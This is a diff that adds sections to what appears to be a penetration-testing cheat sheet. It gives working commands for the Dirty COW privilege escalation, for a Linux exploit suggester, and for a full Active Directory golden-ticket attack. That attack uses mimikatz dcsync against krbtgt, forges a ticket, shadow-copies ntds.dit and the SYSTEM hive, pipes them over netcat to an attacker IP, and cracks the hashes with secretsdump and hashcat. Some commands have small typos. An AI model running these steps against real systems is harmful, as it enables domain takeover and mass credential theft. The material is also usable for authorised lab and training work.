@@ -423,6 +423,108 @@ nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
 cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
 ```
 
+### Dirty cow
+```
+vim dirtycow.txt
+paste in code
+mv dirtycow.txt dirtycow.c
+gcc -pthread dirtycow  -o dirty -lcrypt
+./dirty
+```
+### Linux exploit suggester
+```
+cp /usr/share/linux-exploit-suggester/linux-exploit-suggester.sh
+python -m SimpleHTTPServer 80
+In machine
+wget http://10.8.0.131/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+
+On Kali download an epxloit suggestion and have it in same directory as hosting webserver
+wget http://10.8.0.131/39166.c
+Run exploit using instructions
+```
+
+
+### Golden ticket method
+```
+Once access has been gained from windows machine
+whoami /user
+CopySID - S-1-5-(not this part, it is the RID)
+- Find the domain name:
+systeminfo | findstr /B "Domain"   (e.g. Morrowind-West.province.com)
+
+Find the KRBTGT which is the key distribution account (using mimikatz) so we must get
+mimikatz onto the target machine
+
+On KALI:
+cp -r /usr/share/windows-resources/mimikatz
+Note: If this does not work, download the latest mimikatz from here
+https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe
+python -m SimpleHTTPServer 80
+
+On Windows:
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.8.0.131/mimikatz.exe','c:\Temp\mimikatz2.exe')"
+
+Run mimikatz:
+mimikatz.exe
+
+lsadump::dcsync /domain:Morrowind-West.province.com /user:krbtgt
+
+Copy password hash: which is Hash NTLM
+Golden ticket recipe is;
+DOMAIN - Morrowind-West.province.com
+DOMAIN SID - S-1-5
+KRBTGT - 0f193cde5e5e9765366534e4da178564 (pass hash)
+
+To create:
+kerberos::golden /domain:Morrowind-West.province.com /sid:S-1-5/rc4:0f193cde5e5e9765366534e4da178564 /id:500 /user:kali
+
+Pass ticket:
+kerberos::ptt ticket.kirbi
+
+Now damage:
+pushd \\Morrowind-West.province.com\c$
+cd Windows
+cd NTDS
+
+We can now access the ntds.dit file and extract the passwords as we are inside the domain directory, Once we have this file we have access to every account in the domain.
+
+Perform shadow copy:
+vssadmin create shadow /for=C:
+
+Copy from the shadow directory into tmp
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit
+c:\temp\ntds.dit
+
+Also copy the system config file
+copy\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\SYSTEM
+dir
+
+We now have a copy of ntds.dit and the required System file to decrypt it.
+We should now start extracting it on kali linux so we must move these files over, one way we
+can do this is by putting netcat on the windows machine.
+
+- popd   (This is so that it will allow us to use netcat correctly)
+- cd \Temp
+Windows- powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.8.0.131/nc64.exe', 'c:\Temp\nc64.exe')"
+Kali- nc -lvnp 4444 > SYSTEM
+Windows- nc64.exe 10.8.0.131 4444 < SYSTEM
+Windows- nc.exe 10.8.0.131 4444 < ntds.dit
+
+Now that the files are safely on our kali machine we can begin cracking. We will use a python file called “secretsdump.py
+cp /usr/share/doc/python3-impacket/examples/secretsdump.py
+
+sudo git clone https://github.com/SecureAuthCorp/impacket.git
+python3 secretsdump.py -ntds ./ntds.dit -system SYSTEM LOCAL -outputfile ./myhashes.txt
+
+hashcat -m 1000 myhashes.txt.ntds /home/kali/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
+
+```
+
+
+
+
 
 
 
